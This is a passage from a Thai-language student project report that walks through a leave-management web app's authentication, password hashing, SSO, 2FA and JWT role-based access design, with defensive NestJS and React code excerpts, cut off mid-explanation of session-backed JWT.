# 📋 รายงานสรุปคะแนนและส่วนประกอบของโปรเจกต์ (Grading Checklist Report)

เอกสารนี้สรุปรายละเอียดทั้งหมดตามเกณฑ์การให้คะแนน พร้อมระบุตำแหน่งในโค้ดและวิธีการตรวจสอบ รวมถึงคำอธิบายเชิงลึก (Deep Dive) ในแต่ละจุดประสงค์ทางความปลอดภัยและการออกแบบสถาปัตยกรรมของโปรเจกต์

---

## 📌 อธิบาย Tech Stack และภาพรวมของ App
**App Summary (ภาพรวมแอปพลิเคชัน):** 
ระบบจัดการการลา (Leave Management System) แบบ Full-stack รองรับระบบผู้ใช้งาน 3 ระดับ (Employee, Manager, Admin) โดยสามารถยื่นเรื่องลา ดูประวัติการลา อนุมัติการลา และตรวจสอบประวัติการใช้งานระบบ (System Logs/Audit) ของพนักงานทั้งหมดได้

**Tech Stack และเหตุผลที่เลือกใช้ (Why this stack?):**
- **Frontend:** React (Vite), TypeScript, Axios, Standard React State ควบคู่กับ HTML5 Validation
  - *เหตุผล:* Vite ให้ความเร็วในกระบวนการ Build และ HMR (Hot Module Replacement - การเปลี่ยนและอัปเดตโมดูลหน้าเว็บแบบเรียลไทม์โดยไม่ต้องชาร์จหน้าใหม่) ที่ยอดเยี่ยม, React เอื้อต่อการสร้าง UI (User Interface - ส่วนติดต่อผู้ใช้งาน) แบบ Component-based ที่ดูแลรักษาง่าย (Maintainability), และ TypeScript ช่วยบังคับ Type Safety (ความปลอดภัยของชนิดข้อมูล) ทำให้ดักจับ Error ได้ตั้งแต่ตอนเขียนโค้ด
- **Backend:** NestJS, TypeScript, Prisma ORM (Object-Relational Mapping - ตัวกลางเชื่อมโยงระหว่าง Object ในโค้ดกับตารางใน Database), Passport.js, class-validator
  - *เหตุผล:* NestJS มีโครงสร้างแบบ Modular Architecture ที่ชัดเจนระดับ Enterprise, สนับสนุน Dependency Injection (DI - รูปแบบการจัดโครงสร้างโค้ดที่ลดการผูกมัดหรือพึ่งพากันของโมดูลย่อยๆ) เต็มรูปแบบ, ส่วน Prisma ORM มีจุดเด่นด้าน Type-safe query และกลไก AST (Abstract Syntax Tree - โครงสร้างต้นไม้ประโยคที่แยกฝั่งข้อมูล Input ออกจากคำสั่ง SQL เด็ดขาด) ที่ช่วยป้องกัน SQL Injection ได้เด็ดขาด
- **Database:** PostgreSQL
  - *เหตุผล:* เป็น Relational Database (ฐานข้อมูลเชิงสัมพันธ์) ที่มีเสถียรภาพสูง ทรงพลัง รองรับมาตรฐาน ACID (Atomicity, Consistency, Isolation, Durability - มาตรฐานกลไกฐานข้อมูลที่การันตีว่าข้อมูลจะไม่พังหรือสูญหายเมื่อระบบล่มกลางคัน) ครบถ้วน 
- **Infrastructure:** Docker, Docker Compose (พร้อม Nginx/Pangolin Reverse Proxy - เซิร์ฟเวอร์ผู้พิทักษ์หน้าด่าน)
  - *เหตุผล:* Containerization (การจำลองแอปพลิเคชันและตัวรับรองต่างๆ ใส่ลงในกล่องจำลองสภาพแวดล้อมปิด) ช่วยควบคุมสภาพแวดล้อม (Environment) ให้เหมือนกัน 100% ตั้งแต่เครื่อง Dev ไปจนถึง Production หมดปัญหาคำว่า "รันบนเครื่องฉันได้แต่บนเซิร์ฟเวอร์พัง"
- **Security & Quality:** Argon2id (Password Hashing - การเข้ารหัสผ่านทางเดียว), JWT (JSON Web Token - โทเคนมาตรฐานสำหรับพิสูจน์ตัวตน), สแกนโค้ดด้วย SonarQube
  - *เหตุผล:* Argon2id เป็นมาตรฐานสูงสุดป้องกันการ Brute-force (การใช้เครื่องสุ่มรหัสมหาศาล), JWT (Stateless - เครื่องเซิร์ฟเวอร์ไม่ต้องบันทึกสถานะผู้ใช้งาน) ตอบโจทย์การขยายระบบไร้รอยต่อ, และ SonarQube ให้เป็น Gatekeeper ในการคัดกรอง Code Smells (รูปแบบโค้ดที่อาจก่อปัญหาในอนาคต) กับช่องโหว่ความปลอดภัยก่อนนำขึ้น Production

**มีการ Implement Nipa Cloud หรือไม่?**
*(หมายเหตุ: ส่วนนี้ขึ้นอยู่กับการนำ Docker Compose ปัจจุบันไป Deploy บน VM/Cloud ของคุณ ให้ตอบอาจารย์ตามจริงว่าได้นำไปรันบน Nipa Cloud หรือไม่)*

---

## 🔐 A. Authentication - Password & SSO

### A1. Check password
- **1.1 มีการเช็คทั้งที่ FE และ BE:** **[มี]**
  - **FE (Frontend - หน้าบ้าน):** ใช้ Standard React State ผสานกับ HTML5 Validation Attributes (กติกาการกรอกข้อมูลระดับโครงสร้างของเว็บ เช่น `type="email"`, `required`, `<input minLength>`) เพื่อดักการกรอกข้อมูลและให้ผู้ใช้เห็นแจ้งเตือนทันที (Instant feedback) ป้องกันการแนบ Request (คำร้องขอ) เปล่าประโยชน์ไปรบกวน Server (เซิร์ฟเวอร์หลังบ้าน)
  - **BE (Backend - หลังบ้าน):** ใช้ `class-validator` ใน NestJS DTO (Data Transfer Object - กระบะใส่ข้อมูลที่มีตัวกรองตรวจสอบก่อนส่งต่อ) ควบคู่กับ `@nestjs/common` ValidationPipe (ท่อคัดกรองข้อมูล) เพื่อความถูกต้องขั้นเด็ดขาด (Data Integrity - ความสมบูรณ์และถูกต้องของข้อมูล) ตรงตามหลักการ Defense in Depth (กลยุทธ์การตั้งรับป้องกันทางลึกที่มีด่านตรวจหลายชั้น)
  **ตัวอย่างโค้ด DTO ฝั่ง Backend:**
  ```typescript
  export class RegisterDto {
    @IsEmail()
    @IsNotEmpty()
    email!: string;

    @IsString()
    @IsNotEmpty()
    @MinLength(15, { message: 'Password must be at least 15 characters long' })
    @MaxLength(64, { message: 'Password must not exceed 64 characters' })
    password!: string;
  }
  ```
- **1.2 ตอบปัญหาได้ว่าทำไม Check ที่ FE และ BE:**
  - *อธิบายเชิงลึก:* FE เป็นเรื่องของ UX (User Experience - ประสบการณ์ของผู้ใช้งาน) ช่วยให้ผู้ใช้รู้สึกใช้งานลื่นไหลและเข้าใจจุดที่ผิดพลาดทันที (Fail-fast) แต่ FE ไม่ใช่ Security Boundary (เขตแดนการป้องกันแท้จริง) เพราะ Attacker (ผู้โจมตี) สามารถปิด JavaScript, แก้ไข DOM (Document Object Model - โครงสร้างของหน้าเว็บฝั่งเบราว์เซอร์), หรือยิง HTTP Request ตรงๆ ผ่านซอฟต์แวร์ยิง API นอกเบราว์เซอร์อย่าง Postman/Burp Suite (ซอฟต์แวร์วิเคราะห์การสื่อสารของแฮกเกอร์) ข้ามหน้าเว็บได้ทั้งหมด ดังนั้นจุดตายสุดท้ายที่ต้องทำการ Validation อย่างเข้มงวดที่สุดจึงหนีไม่พ้น BE (Server-side validation)

### A2. Password policy (OWASP - โครงการรวบรวมมาตรฐานความปลอดภัยแอปพลิเคชันเว็บโลก)
- **2.1 Length:** **[มี]** เช็คความยาวผ่าน `@MinLength(15)` และ `@MaxLength(64)` ใน `RegisterDto` (สอดคล้องกับ OWASP ที่แนะให้ตั้งยาวตั้งแต่ 15 ตัวอักษรขึ้นไปสำหรับระบบ Without MFA - ระบบที่ไม่มีตัวยืนยันสองชั้น และรองรับ Passphrase - กลุ่มกลุ่มคำที่แทนพาสเวิร์ด สูงสุด 64 ตัวอักษร)
- **2.2 Password strength meter:** **[มี]** Frontend หน้า Register มี Component แสดงแถบสถานะ (Component - ชิ้นส่วนย่อยประกอบการทำงาน) ฟังก์ชัน `calculatePasswordStrength` ประเมินคะแนน 0-5 ตามความซับซ้อนของรหัสผ่าน (ความยาว, ตัวพิมพ์เล็ก, พิมพ์ใหญ่, ตัวเลข, อักขระพิเศษ) และแสดงผลเป็นหลอดสีพร้อมข้อความ (Weak, Fair, Good, Strong)
  **ตัวอย่างโค้ดคำนวณคะแนนฝั่ง Frontend:**
  ```typescript
  const calculatePasswordStrength = (password: string) => {
    let score = 0;
    if (!password) return 0;
    if (password.length >= 8) score += 1;
    if (password.length >= 15) score += 1;
    if (/[a-z]/.test(password)) score += 1;
    if (/[A-Z]/.test(password)) score += 1;
    if (/\d/.test(password)) score += 1;
    if (/[!@#$%^&*?]/.test(password)) score += 1;
    return score;
  };
  ```
- **2.3 Check against breach:** *[ข้อชี้แจง: การเชื่อม API สาธารณะอย่าง HIBP อาจสร้าง Latency และมีข้อกำจัดด้าน Rate Limit ในสเกลโปรเจกต์ขนาดเล็ก แต่โครงสร้างพร้อมรองรับ Middleware ในอนาคต]*
- **2.4 Allow Unicode/Whitespace:** **[มี]** Regex ของ `class-validator` ไม่ได้บล็อกเซ็ตของ Unicode หรือ Spacebar ผู้ใช้จึงสามารถตั้ง Passphrase ที่เป็นประโยคยาวๆ หรือเป็นภาษาไทยได้เต็มที่ (ส่งเสริม Entropy ที่ดีกว่ารหัสผ่านสั้นๆ แบบสุ่ม)
- **2.5 Error message safe:** **[มี]** `backend/src/auth/auth.service.ts` ในฟังก์ชัน Login หากรหัสหรืออีเมลผิด จะ Response แจ้งว่า "Invalid email or password." เสมอ (Generic Message) ไม่บอกชัดเจนว่าสรุปว่า "ไม่พบอีเมลในระบบ" หรือ "รหัสผ่านผิด" เพื่อป้องกันการที่ Hacker ใช้หลักการ User Enumeration เช็ครายชื่อคนในองค์กร
  **ตัวอย่างโค้ดแสดง Generic Message:**
  ```typescript
  if (!isValidPassword) {
    // บันทึกการล็อกอินผิดพลาด...
    throw new UnauthorizedException('Invalid email or password');
  }
  ```
- **2.6 Rate limit login:** **[มี]** อาศัยโครงสร้างล็อกล่วงเวลา (Account Lockout) เมื่อล็อกอินผิดเกิน 5 ครั้ง ระบบจะระงับบัญชี 15 นาที ป้องกัน Automated Brute-force Attack และ Credential Stuffing
  **ตัวอย่างโค้ด Account Lockout:**
  ```typescript
  const MAX_FAILED_LOGIN_ATTEMPTS = 5;
  const LOGIN_LOCK_DURATION_MS = 15 * 60 * 1000;
  ```

### A3. Password Storage (ไม่เก็บ Plaintext)
- **3.1 อธิบายข้อมูลใน Database:** **[มี]** เก็บใน `schema.prisma` Field `password` เป็นค่า Hash String (เช่น `$argon2id$v=19$m=65536,t=3,p=4$c2FsdHN0cmluZw$aGFzaGVkcGFzc3dvcmQ...`) ข้อมูลนี้เมื่อถูกแฮก Database ออกไป (Data Breach) แฮกเกอร์ก็ไม่สามารถอ่านรหัสผ่านดั้งเดิมได้
  - *อธิบายโครงสร้างของ Argon2 Hash String:*
    - `$argon2id` : บ่งบอกถึงอัลกอริทึมที่ถูกใช้งาน
    - `$v=19` : เวอร์ชันของอัลกอริทึม (Version 19 เป็นเวอร์ชันมาตรฐานปัจจุบัน)
    - `$m=65536,t=3,p=4` : พารามิเตอร์ความยากในการแก้รหัส (m = Memory cost, t = Time cost, p = Parallelism)
    - `$c2FsdHN0cmluZw` : ค่า Salt ประจำตัวรหัสผ่านนี้ (ถูกแปลงรูปให้อยู่ในฐาน Base64)
    - `$aGFzaGVkcGFzc...` : รหัสผ่านที่ผ่านการคำนวณ Hash ร่วมกับ Salt เสร็จสมบูรณ์ (แปลงรูปในฐาน Base64 เช่นกัน)
- **3.2 ใช้ Argon2 / Bcrypt (พร้อมอธิบายเหตุผล):** **[มี]** ใช้ **Argon2id** (OWASP Recommended แชมป์ Password Hashing Competition)
  - *อธิบายเชิงลึก (Components & Configuration):*
    - **Argon2id** ผสมผสานจุดเด่นของ Argon2d (ต้านทาน GPU/ASIC cracking - การใช้การ์ดจอหรือชิปประมวลผลเฉพาะทางที่ออกแบบมาเพื่อสุ่มเดารหัสผ่านด้วยความเร็วโคตรมหาศาล) และ Argon2i (ป้องกันการโจมตีแบบ Side-channel timing attacks - ทริคของแฮกเกอร์ที่แอบเปรียบเทียบหรือจับเวลาเสี้ยววินาทีที่เซิร์ฟเวอร์ใช้คำนวณ Hash เพื่อแกะรอยและเดาโครงสร้างรหัสผ่าน)
      - *ต้านทาน GPU ให้อยู่หมัดได้อย่างไร? (How Argon2d works):* การ์ดจอเก่งเรื่องประมวลผลคณิตศาสตร์พร้อมกันหลายสายก็จริง แต่มีจุดอ่อนร้ายแรงคือ "ความหน่วงในการสลับอ่านเขียนข้อความบน RAM แบบกระจัดกระจาย" (Random Memory Access) Argon2 ใช้ประโยชน์จากจุดนี้โดยบังคับให้อัลกอริทึมจองพื้นที่ RAM ก้อนใหญ่ๆ ไว้ แล้วสุ่มกระโดดอ่านเขียนหน่วยความจำข้ามไปข้ามมาแบบคาดเดาไม่ได้ การ์ดจอที่มีเป็นพันคอร์จึงสู้ไม่ไหวเพราะ VRAM ไม่พอจ่ายระดับกิกะไบต์ให้ทุกคอร์ทำงานพร้อมกันจนเกิดคอขวด (Memory Hardness)
      - *ต้านทาน Timing Attack ให้อยู่หมัดได้อย่างไร? (How Argon2i works):* ในอัลกอริทึมยุคเก่า หากเซิร์ฟเวอร์ดึงข้อมูลจาก RAM โดยอิงจาก "ค่ารหัสผ่าน" แฮกเกอร์จะจับเวลาความช้า-เร็ว (CPU Cache hit/miss) เพื่อทายตัวอักษรรหัสผ่านทีละตัวได้ แต่ Argon2i ออกแบบกลไกบังคับให้ลำดับการอ่าน RAM ต้องอิงจาก "ค่าจำนวนรอบ (Counter)" และ "ค่า Salt" เท่านั้น **โดยไม่เอาตัวรหัสผ่านจริงมาเป็นตัวตัดสินใจในการสลับตำแหน่ง RAM** (Data-independent memory access) ทำให้ไม่ว่ารหัสจะคืออะไร ระบบก็จะดำเนินการด้วยจังหวะที่เท่ากันเป๊ะเสมอ แฮกเกอร์จึงไม่ได้เบาะแสใดๆ จากการจับเวลา
    - **m=65536 (Memory Cost):** บังคับให้การเดารหัส 1 ครั้งต้องกิน RAM อย่างน้อย 64MB ถ้าแฮกเกอร์ใช้เครื่องที่มี GPU หลายพัน Core จะเจอคอขวดที่ RAM จำนวนมหาศาล ทำให้ Brute-force ช้าลงเป็นพันเท่า
    - **t=3 (Time Cost):** จำนวน Iterations บังคับให้แกนประมวลผลต้องปั่นวงจร 3 รอบต่อ 1 การคำนวณ
    - **p=4 (Parallelism):** บังคับใช้ 4 Threads ในการคำนวณ เพื่อให้ฝั่งคนกันใช้ Multi-core สู้กลับได้เต็มประสิทธิภาพ
- **3.3 มี Salt อัตโนมัติ:** **[มี]** Argon2id จะแรนดอมค่า Salt อัตโนมัติ (Cryptographically Secure Pseudo-Random Number Generator: CSPRNG) ขนาด 16-byte แล้วประกอบเป็น String รวมไปกับ Hash เลย (`$c2Fsd...`) ทำให้คน 2 คนที่รหัสพาสเวิร์ดตั้งเหมือนกัน 100% ก็จะได้ค่า Hash Database ออกมาคนละหน้าตากัน ป้องกันการใช้ตาราง Rainbow Table โจมตี
  **ตัวอย่างโค้ดการใช้งาน Argon2 ใน AuthService:**
  ```typescript
  import * as argon2 from 'argon2';

  // ตอนเข้ารหัสหน้าสมัครสมาชิก
  const hashedPassword = await argon2.hash(userDto.password);

  // ตอนตรวจสอบหน้าเข้าสู่ระบบ
  const isValidPassword = await argon2.verify(user.password, loginDto.password);
  ```

### A4. SSO (Single Sign-On ด้วย Google)
- **4.1 ฝั่ง Google ต้องทำอะไร:** ต้องสร้าง Credentials บน Google Cloud Console -> หมวด APIs & Services -> ทำการ Create OAuth 2.0 Client ID ประเภท Web application -> นำ URI ของ Server เราไปลงทะเบียนในช่อง "Authorized redirect URIs"
- **4.2 ดึงอะไรมาบ้าง:** **[มี]** ดึงรหัส `sub` (Google Account ID ที่เป็นตัวเลขตายตัวระดับโลก), Email, และข้อมูล Profile Information เบื้องต้น (ชื่อนามสกุล) 
  **ตัวอย่างฟังก์ชัน Validate ภายใน `GoogleStrategy` (`backend/src/auth/strategies/google.strategy.ts`):** 
  จะเห็นได้ว่ามีการรับ Object `profile` จาก Google แล้วเราเลือกสกัด (Select / Destructure) ข้อมูลสำคัญมาเฉพาะที่ต้องใช้
  ```typescript
  validate(accessToken: string, refreshToken: string, profile: Profile) {
    const { name, emails } = profile; // สกัดชื่อและอีเมลออกมาจากข้อมูลดิบ
    const user = {
      email: emails?.[0]?.value || '',
      name: name?.givenName || profile.displayName || '',
      role: 'employee',
    };
    return user; // โยน Object ก้อนนี้ไปสร้าง (Register) หรือเข้าสู่ระบบต่อไป
  }
  ```
- **4.3 ดึงชื่อนามสกุลต้องทำอย่างไร:** ต้องระบุ Scopes ตอนเริ่มโยน User ไปหน้า Google (ใน `GoogleStrategy` กำหนดว่า `scope: ['email', 'profile']`)
  **ตัวอย่างจาก `GoogleStrategy`:**
  ```typescript
  export class GoogleStrategy extends PassportStrategy(Strategy, 'google') {
    constructor(...) {
      super({
        clientID: ...,
        clientSecret: ...,
        callbackURL: '...',
        scope: ['email', 'profile'], // กำหนด Scope ตรงนี้เจาะจงว่าขอแค่โปรไฟล์และอีเมลพื้นฐาน ไม่รวมรูปถ่ายหรือข้อมูลส่วนบุคคลอื่นๆ เชิงลึก
      });
    }
  }
  ```
- **4.4 ฝั่ง Web App ต้องทำอะไร:** มี Route เริ่มต้นเพื่อส่ง Redirect ผู้ใช้ไปโฮสต์ Google ซิงก์กับ `@nestjs/passport` และ `passport-google-oauth20` ถัดมาต้องมี Route `ห/auth/google/callback` ไว้รอรับ Request ขากลับ นำโค้ดแลกเปลี่ยนเป็น Access Token กับ Google API
  **ตัวอย่างจาก `auth.controller.ts` (ฝั่ง Backend):**
  ```typescript
  // ส่งผู้ใช้ไปหน้า Login ของ Google
  @Get('google')
  @UseGuards(AuthGuard('google'))
  async googleAuth() {
    // Initiates the Google OAuth2 login flow
  }

  // รอรับขากลับจาก Google นำข้อมูล Payload มาจัดเป็น JWT ให้ผู้ใช้
  @Get('google/callback')
  @UseGuards(AuthGuard('google'))
  async googleAuthRedirect(@Req() req: Request, @Res() res: Response) {
    const user = req.user as { email: string; name: string; role?: string };
    const { accessToken, refreshToken } = await this.authService.oauthLogin(user);
    this.setAuthCookies(res, accessToken, refreshToken);
  }
  ```
- **4.5 Check ล็อกอินซ้ำ:** ตรวจสอบผ่าน `prisma.user.findUnique({ where: { email } })` ถ้าเป็นอีเมลใหม่ก็จัดการลงทะเบียน (Auto-register) หรือถ้าเคยมีในระบบแล้วก็ดึงขึ้นมาสร้าง JWT Access Token ให้พร้อมใช้งาน
  **ตัวอย่างจาก `auth.service.ts`:**
  ```typescript
  async oauthLogin(record: OAuthRecord): Promise<AuthResult> {
    // 1. ลองค้นหาว่าเคยล็อกอินด้วยอีเมลนี้มาก่อนหรือไม่
    let user = await this.prisma.user.findUnique({
      where: { email: record.email },
      include: { role: true },
    });

    if (!user) {
      // 2. ถ้าไม่พบ ให้จัดการสร้าง User ใหม่ และกำหนดโควตาวันลาอัตโนมัติ (Auto-register)
      const roleId = await this.getDefaultRoleId();
      user = await this.prisma.user.create({
        data: { email: record.email, name: record.name, password: '', roleId },
        include: { role: true },
      });
      await this.assignDefaultLeaveQuotas(user.id);
    }

    // 3. ปั๊ม Token กลับให้ใช้งานต่อ
    return this.tokenService.issueAuthTokens(user);
  }
  ```

### A5. & A6. Bonus: 2FA & Forget Password
- **5.1 2FA (Two-Factor Authentication):** **[มี]** `backend/src/auth/two-factor.service.ts` 
  - *อธิบายเชิงลึก:* ใช้ Library `otplib` ระบบจะสร้าง Random Base32 Secret สำหรับผู้ใช้นั้นๆ (และเก็บลง DB แบบผูกติด User) จากนั้นสร้าง URL แบบ `otpauth://totp/AppName:UserEmail?secret=XXXX` แล้วแปลงเป็น QR Code (ด้วย `qrcode`) ให้แอป Google Authenticator นำไปสแกน อัลกอริทึม (TOTP - Time-Based One Time Password) จะนำ Secret Key ควบรวมกับ Unix Timestamp ของเครื่อง (ทุก 30 วินาที) เข้าฟังก์ชัน HMAC-SHA1 เพื่อออกมาเป็นตัวเลข 6 หลัก (Compensating Control ลดความเสี่ยงพาสเวิร์ดหลุด)
  **ตัวอย่างฟังก์ชันการสร้าง 2FA (`two-factor.service.ts`):**
  ```typescript
  async generateSecret(userId: string) {
    const user = await this.findUserOrThrow(userId);
    const secret = generateSecret(); // สมองกลในการสร้างกุญแจ Base32
    
    const appName = this.configService.get<string>('APP_NAME') || 'FSD-App';
    const otpauthUrl = generateURI({ issuer: appName, label: user.email, secret });
    
    await this.prisma.user.update({ where: { id: userId }, data: { twoFactorSecret: secret } });
    
    // แปลง URL ให้เป็น QR Code Base64 เพื่อส่งกลับไปให้หน้าจอ React วาดภาพได้ทันที
    const qrCode = await qrcode.toDataURL(otpauthUrl);
    return { secret, qrCode, otpauthUrl };
  }
  ```
- **6.1 Forget Password:** **[มี]** `backend/src/auth/auth.service.ts`
  - *อธิบายเชิงลึก:* เมื่อผู้ใช้เลือก Forgot ระบบจะออก Token แบบสุ่มความยาวด้วยคำสั่ง `randomUUID()` จากโมดูล `node:crypto` เก็บลงระบบคู่กับ Time-to-Live (Expiry ภายใน 15 นาทีตามหลักความปลอดภัยสูงสุด) พร้อมอีเมลหาผู้ใช้งานเพื่อแจ้ง Token เมื่อผู้ใช้นำ Token มาสร้างรหัสผ่านใหม่สำเร็จแล้ว Token นั้นจะถูกทำลายทิ้ง (Invalidated by Nullifying in Database) นำกลับมาใช้ซ้ำ (Replay Attack) ไม่ได้
  **ตัวอย่างฟังก์ชัน Forget และ Reset Password (`auth.service.ts`):**
  ```typescript
  async forgotPassword(email: string) {
    const user = await this.prisma.user.findUnique({ where: { email } });
    // ใช้ Security Pattern แบบไม่ชี้เป้า ว่าเมลนี้มีอยู่จริงในระบบหรือไม่ ป้องกันการ Enumeration
    if (!user) return { message: 'If this email exists, a reset link has been sent.' };

    const resetToken = randomUUID(); // สร้าง UUID v4 คาดเดาไม่ได้
    const expiresAt = new Date(Date.now() + 15 * 60 * 1000); // 15 mins TTL

    await this.prisma.user.update({
      where: { id: user.id },
      data: { resetPasswordToken: resetToken, resetPasswordExpiresAt: expiresAt },
    });
    
    await this.sendPasswordResetEmail(email, resetToken); // ยิง Email ผ่าน nodemailer
    return { message: 'If this email exists, a reset link has been sent.' };
  }

  async resetPassword(token: string, newPassword: string) {
    const user = await this.prisma.user.findFirst({ where: { resetPasswordToken: token } });
    if (!user?.resetPasswordExpiresAt || user.resetPasswordExpiresAt < new Date()) {
      throw new BadRequestException('Invalid or expired reset token');
    }

    const hashedPassword = await argon2.hash(newPassword);
    await this.prisma.user.update({
      where: { id: user.id },
      data: {
        password: hashedPassword,
        resetPasswordToken: null,       // ทิ้ง Token เดิมทันที
        resetPasswordExpiresAt: null, 
        currentSessionId: null,         // บังคับเตะผู้ใช้ทุกเครื่องออกจากระบบ (Force Logout) 
      },
    });
  }
  ```

---

## 🎟️ B. JWT (JSON Web Token)

### B1. Follow Requirement (แยก Role)
- **1.1. Check 3 role:** ระบบกำหนด Enum ประกอบด้วย `EMPLOYEE`, `DEPARTMENT` (Manager), `ADMIN`
- **1.2. UI ไม่แชร์กัน:** `frontend/src/pages/` ถูกแบ่ง Component เป็น Personal, Department และ Management ชัดเจน Frontend จะ Decode JWT (หรือเช็คสถานะจาก `/auth/me`) แล้ว Render Route ให้ตรงกับ Role ถ้ายูสเซอร์ Role ไม่ถึงก็จะไม่เห็นเมนูของ Role สูงกว่า
  - *อธิบายเชิงลึก (UI Rendering & Client-side Protection):* ระบบ Frontend ถูกออกแบบการทำ Conditional Rendering (การแสดงผลตามเงื่อนไข) อย่างเคร่งครัด โดย Component แม่ข่ายอย่าง `LeaveLayout.tsx` จะรับ Props `userRole` มาประเมินเพื่อควบคุมการแสดงผลปุ่มเมนูบน Sidebar ทันที ทำให้ Employee ธรรมดาจะไม่มีทางเห็นเมนูระดับสูงอย่าง Department หรือ System Logs เลย
  **ตัวอย่างโค้ดการควบคุมการแสดงผล UI จาก `LeaveLayout.tsx`:**
  ```tsx
  {/* เมนู Department จะแสดงเฉพาะสิทธิ์ Manager และ Admin ขึ้นไปเท่านั้น */}
  {(userRole === "manager" || userRole === "admin") && (
    <button className="sidebar-link" onClick={() => navigate("/dashboard/department")}>
       Department
    </button>
  )}

  {/* เมนูหน้า Leave Logs พิเศษสำหรับแผนก HR และ Admin เท่านั้น */}
  {(userRole === "admin" || (userRole === "manager" && departmentName === "Human Resources")) && (
    <button className="sidebar-link" onClick={() => navigate("/dashboard/logs")}>
       Leave Logs
    </button>
  )}
  ```
  - *การป้องกันการฝืนเข้าผ่าน URL (Direct URL Access Prevention):* แม้ผู้ใช้จะรู้ URL ลับ (เช่น พิมพ์ `/dashboard/department` เองบน Address Bar) หน้าต่าง Component นั้นๆ (เช่น `DepartmentLeaveDashboard.tsx`) จะมีการดักฟังสถานะด้วยฟังก์ชัน `getDashboardData()` ทันทีที่โหลดหน้าผ่าน `useEffect` ซึ่งด้านในจะยิงรีเควสไปหา `/auth/me` ถ้าระบบ Backend พบว่า Role ของผู้ใช้มีสิทธิ์ไม่ถึง ก็จะตอบกลับเป็น 403 Forbidden หรือ 401 Unauthorized ทำให้ Frontend สั่ง Redirect กลับไปหน้า Login ทันที
  **ตัวอย่างโค้ดดักจับจาก `DepartmentLeaveDashboard.tsx`:**
  ```tsx
  useEffect(() => {
    const loadData = async () => {
      try {
        // ยิงไปถาม BE ถ้าไม่มีสิทธิ์ จะเกิด Error วิ่งตกไปที่บล็อก catch ทันที
        const [deptData, userData] = await Promise.all([ getDepartmentLeave(), getDashboardData() ]);
        setUserRole(userData.role);
      } catch {
        setError("Access denied or session expired.");
        setTimeout(() => navigate("/login"), 2000); // ดีดผู้ใช้ที่ไม่มีสิทธิ์ออก
      }
    };
    loadData();
  }, [navigate]);
  ```
- **1.3. สิทธิ์ Database ต่างกัน:** 
  - *อธิบายเชิงลึก (Data Filtering):* ฝั่ง Backend ที่ไฟล์ Controller และ Service จะมีการสกัด Role จาก `req.user` แล้วเขียนเงื่อนไข If ขวางเพื่อแยก Query ระดับ Prisma อย่างชัดเจน
  - `EMPLOYEE`: ค้นขอบเขตจำกัด โดยผูกตัวแปร `userId` เพื่อดึงข้อมูลเฉพาะของตัวเองเท่านั้น
  - `DEPARTMENT`: ทำ Query สอดคล้องกับ `departmentId` ของคนขอ เพื่อให้เห็นข้อมูลของคนเฉพาะในแผนกเดียวกัน
  - `ADMIN`: ข้าม Filter ประมวลผลดึง `findMany( )` แบบเพียวๆ เพื่อดูของพนักงานทั้งหมด
  **ตัวอย่างโค้ดเช็คสิทธิ์ระดับ Controller (`leaves.controller.ts`):**
  ```typescript
  @Get()
  findAll(@Request() req: UserRequest) {
    if (req.user.role === 'employee') {
      return this.leavesService.findByUserId(req.user.id);
    }
    if (req.user.role === 'manager') {
      return this.leavesService.findByDepartmentId(req.user.departmentId);
    }
    return this.leavesService.findAll(); // สำหรับ Admin
  }
  ```
  **ตัวอย่างโค้ดประมวลผล Database ระดับ Service (`leaves.service.ts`):**
  ```typescript
  // สิทธิ์ Employee (เห็นแค่ของตัวเอง)
  async findByUserId(userId: string) {
    return this.prisma.leaveRequest.findMany({ where: { userId } });
  }

  // สิทธิ์ Manager (เห็นทั้งแผนก)
  async findByDepartmentId(departmentId: string) {
    return this.prisma.leaveRequest.findMany({ where: { user: { departmentId } } });
  }

  // สิทธิ์ Admin (เห็นทั้งหมด)
  async findAll() {
    return this.prisma.leaveRequest.findMany(); 
  }
  ```
  - ขาดไม่ได้คือ `@Roles()` Guard (`backend/src/auth/roles.guard.ts`) ขัดขวางระดับ Endpoint ไม่ให้ Role ต่ำเรียก API ผิดประเภท
  **ตัวอย่างโค้ด NestJS Role Guard:**
  ```typescript
  @Injectable()
  export class RolesGuard implements CanActivate {
    constructor(private readonly reflector: Reflector) {}

    canActivate(context: ExecutionContext): boolean {
      const requiredRoles = this.reflector.getAllAndOverride<string[]>(
        ROLES_KEY, [context.getHandler(), context.getClass()]
      );
      if (!requiredRoles) return true;

      const { user } = context.switchToHttp().getRequest<{ user?: { role: string } }>();
      return requiredRoles.includes(user?.role ?? '');
    }
  }
  ```

### B2. & B3. การสร้าง JWT
- **Design Concept (B2): Hybrid (Stateful JWT)** 
  - *อธิบายเชิงลึก:* ระบบของเราแก้จุดอ่อนที่ร้ายแรงที่สุดของ Pure JWT (คือการยกเลิก/เตะผู้ใช้ทันทีไม่ได้) ด้วยการทำระบบ **Session-backed JWT** คือมีการสร้าง `currentSessionId` ผูกติดลงไปใน Database และฝังลงใน Payload ของ JWT ด้วย 
  - **Role ฝังลง Payload แล้วปลอดภัยไหม?:** "ปลอดภัยล้านเปอร์เซ็นต์จากการปลอมแปลง" แม้ Hacker จะไป Decode ตัว Base64 แล้วแอบแก้ `"role": "EMPLOYEE"` ให้กลายเป็น `"ADMIN"` ก็ตาม แต่พอนำกลับมายิงเข้า Server ตัวระบบ (NestJS Passport) จะนำ Header กับ Payload ของแฮกเกอร์ไปเข้าสมการคณิตศาสตร์เพื่อคำนวณ "ลายเซ็น (Signature)" ใหม่ด้วยกุญแจ `JWT_SECRET` (ซึ่งแฮกเกอร์ไม่มีทางรู้) ตามสูตร `HMAC-SHA256(Header + Payload, Secret)` ผลลัพธ์คือค่า Hash ที่คำนวณได้ใหม่จะไม่ตรงกับ Signature เก่าที่แสตมป์มาด้านท้ายของ Token ระบบจึงล่วงรู้ทันทีว่า "เอกสารนี้ถูกสอดไส้แก้ไขกลางทาง (Tampered)" และจะปัดตกพร้อมขึ้น `401 Unauthorized` ในเสี้ยววินาที
  - **ทำไมต้องใช้ Session ID ตรวจซ้ำ (ข้อดีที่ชัดเจนสุดยอดของ Stateful JWT):** เมื่อ `JwtStrategy` ยืนยันลายเซ็นผ่านแล้ว จะมีการโยนเข้า Service เพื่อเทียบ `payload.sessionId` กับค่า `currentSessionId` ใน Database ปัจจุบัน ซึ่งข้อดีที่เหนือกว่า Pure JWT แบบขาดลอยคือ:
